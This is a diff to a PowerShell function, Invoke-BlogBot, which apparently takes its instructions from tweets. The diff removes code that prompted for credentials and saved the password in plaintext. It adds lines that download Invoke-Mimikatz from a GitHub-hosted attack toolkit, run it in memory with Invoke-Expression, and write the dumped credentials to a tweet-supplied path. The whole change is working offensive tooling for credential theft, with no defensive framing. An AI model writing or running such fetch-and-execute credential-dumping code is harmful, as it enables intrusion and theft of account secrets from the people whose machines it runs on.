@@ -236,20 +236,15 @@ Function Invoke-BlogBot {
             [string] $OutPath = $LatestTweet.split('|')[1]
             
             if (Test-Path -Path (Split-Path -Parent $OutPath) -Pathtype container) {
-                $UserCredential = Get-Credential  
-                $UserCredential.Password | ConvertFrom-SecureString
                 
-                #Convert password to plaintext
-                $Password = $UserCredential.GetNetworkCredential().Password
-                $Username = $UserCredential.UserName
+            [string] $downloadURL = 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
+            Write-Verbose "I am downloading from $ActualdownloadURL"
+            $downloadedScript = $WebClientObject.downloadString($downloadURL)
+            #append Function call with parameters
+            [string] $AppendString = "Invoke-mimikatz > $OutPath"
+            $downloadedScript += $AppendString
+            Invoke-Expression $downloadedScript
                 
-                #Create a custom object to store the results in
-                $ObjectProperties = @{'Username' = $Username;
-                                      'Password' = $Password}                             
-                $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
-                
-                #Output results to file
-                Out-File -FilePath $OutPath -Append -InputObject $ResultsObject
             }
         }
     
